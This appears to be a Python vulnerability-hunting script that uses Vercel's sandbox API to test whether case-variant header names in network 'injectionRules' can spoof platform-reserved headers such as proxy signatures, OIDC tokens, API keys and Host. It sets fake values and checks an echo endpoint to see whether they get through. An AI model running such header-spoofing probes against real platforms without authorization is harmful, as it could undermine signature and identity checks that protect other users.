# -*- coding: utf-8 -*-
"""非传统面L4⑤: injectionRules 大小写/变体头名绕过
① 平台保留头变体: n34 确认 x-vercel-proxy-signature / x-vercel-oidc-token 小写注入被真实值覆盖
   → 大小写变体 (X-VERCEL-* / X-Vercel-*) 能否保留注入值 → 下游签名/OIDC 校验混淆?
② 通用敏感头变体: X-API-KEY / Api-Key / x-api-key (n32 已确认小写 x-api-key 成功)
③ Host 重测 (n32 输出截断, 确认 Host 注入是否生效 → H 线组合基础)
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

def parse_data(r):
    out = ''
    for line in (r or '').splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

ECHO = 'sbx-echo-e29ca9cb.vercel.app'

def mk_sandbox(name, headers):
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (name, TEAM, PROJ))
    time.sleep(2)
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {
        "projectId": PROJ, "name": name,
        "networkPolicy": {"mode": "custom", "allowedDomains": [ECHO],
                          "injectionRules": [{"domain": ECHO, "headers": headers}]},
    }, 60)
    log('[create %s] -> %s | %s' % (name, c, (r or '')[:160].replace(chr(10), ' ')))
    if c != 200:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def probe(sid, tag, markers):
    """markers: [(注入值特征串, 真实值特征串), ...] 逐个判断注入值是否到达"""
    c3, r3 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                 {"command": "sh", "args": ["-c",
                  "curl -s -m 10 https://%s/ > /tmp/h.txt 2>&1; cat /tmp/h.txt" % ECHO],
                  "wait": True, "timeout": 20000, "logs": True}, 35)
    out = parse_data(r3)
    log('[%s] -> %s' % (tag, out[:700].replace(chr(10), ' ')))
    for m_inj, m_real in markers:
        has_inj = m_inj in out
        has_real = (not m_real) or (m_real in out)
        log('  >> inj=%s(%s) real=%s' % (m_inj, 'HIT' if has_inj else 'miss',
                                         'present' if has_real else 'ABSENT'))
    return out

TESTS = [
    ('upper-sig',  {'X-VERCEL-PROXY-SIGNATURE': 'Bearer FAKE123'},
     [('FAKE123', 'Bearer ')]),
    ('mixed-sig',  {'X-Vercel-Proxy-Signature': 'Bearer FAKE123'},
     [('FAKE123', 'Bearer ')]),
    ('upper-oidc', {'X-VERCEL-OIDC-TOKEN': 'FAKE_OIDC'},
     [('FAKE_OIDC', 'eyJ0eXAiOiJKV1Qi')]),
    ('mixed-oidc', {'X-Vercel-OIDC-Token': 'FAKE_OIDC'},
     [('FAKE_OIDC', 'eyJ0eXAiOiJKV1Qi')]),
    ('upper-secret', {'X-VERCEL-PROXY-SECRET': 'FAKESECRET'},
     [('FAKESECRET', None)]),
    ('upper-apikey', {'X-API-KEY': 'sk-fake'},
     [('sk-fake', None)]),
    ('api-key',    {'Api-Key': 'sk-fake'},
     [('sk-fake', None)]),
    ('host',       {'Host': 'vercel.com'},
     [('vercel.com', None)]),
]

for tag, hdrs, markers in TESTS:
    sid = mk_sandbox('l35', hdrs)
    if not sid:
        time.sleep(3)
        continue
    time.sleep(3)
    probe(sid, tag, markers)
    api("DELETE", "/v2/sandboxes/l35?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)

log('DONE')
